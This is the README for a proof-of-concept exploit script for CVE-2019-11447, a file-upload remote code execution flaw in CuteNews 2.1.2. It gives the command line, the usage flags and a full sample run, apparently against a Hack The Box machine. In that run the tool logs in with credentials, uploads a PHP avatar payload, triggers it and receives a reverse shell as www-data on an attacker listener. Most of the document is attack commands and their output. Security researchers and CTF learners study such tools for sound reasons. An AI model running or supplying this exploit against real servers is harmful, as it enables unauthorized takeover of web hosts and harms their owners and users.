# CVE-2019-11447
## CutePHP Cute News 2.1.2 RCE PoC

**Target :** 2.1.2

This PoC script is based on a simple implementation of the original exploit by **BobbySox**. The original exploit is an MSF module by **Akuss**.

This script needs the target ip address or domain along with credentials and it will automatically login, upload payload, trigger it and catch the reverse shell.

```
python cve-2019-11447.py -t 10.10.10.206 -u twh -p p4ssw0rd -lh 10.10.16.2 -lp 4444 -f shell

--------------------------------------
--- CVE-2019-11447 -------------------
--- CuteNews Arbitrary File Upload ---
--- CutePHP CuteNews 2.1.2 -----------
--------------------------------------

[>] Found By : Akkus       [ https://twitter.com/ehakkus     ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]

[>] Target   : http://10.10.10.206/CuteNews/index.php
[>] Username : twh
[>] Password : p4ssw0rd

[!] Logging in...
[+] Logged In!
[+] Loading Profile...
[+] Searching Signatures...
[!] Uploading Payload...
[+] Loading Profile...
[+] Searching Avatar URL...
[*] URL : http://passage.htb/CuteNews/uploads/avatar_twh_shell.php
[!] Payload will trigger in 5 seconds...
[!] Starting Listner...
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.206 on port 35196
[*] Switching to interactive mode
bash: cannot set terminal process group (1656): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ $ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@passage:/var/www/html/CuteNews/uploads$ $
```

## Dependencies

```
pip3 install requests bs4 pwntools
```

## Usage

```
python cve-2019-11447.py -h
usage: cve-2019-11447.py [-h] [-t TARGET] [-u UNAME] [-p PASSW] [-lh LHOST] [-lp LPORT] [-f FILE]

optional arguments:
  -h, --help                    show this help message and exit
  -t TARGET, --target TARGET    Target IP address or domain
  -u UNAME, --uname UNAME       Username
  -p PASSW, --passw PASSW       Password
  -lh LHOST, --lhost LHOST      Listener IP address
  -lp LPORT, --lport LPORT      Listener Port
  -f FILE, --file FILE          Filename for payload WITHOUT extension
```

## Credits

* Thank you **Akuss** for discovering this vulnerability
    * https://www.exploit-db.com/exploits/46698/

* Thank you **BobbySox** for implementing it in a simple way
    * https://github.com/kyle41111/CuteScript